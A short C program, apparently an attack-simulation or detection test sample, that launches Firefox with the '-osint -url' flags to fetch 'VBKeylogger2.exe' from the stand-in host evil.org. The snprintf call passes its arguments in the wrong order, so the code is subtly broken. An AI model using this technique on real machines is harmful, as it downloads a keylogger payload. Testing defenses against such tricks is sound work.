#include "helpers.h"


int main() {
    const int bufferLen = 300;
    char firefoxPath[bufferLen];
    snprintf(firefoxPath, "\"%s\\Mozilla Firefox\\firefox.exe\" -osint -url \"https://www.evil.org/VBKeylogger2.exe\"", getenv("ProgramFiles"), bufferLen);
    return run_command(firefoxPath);
}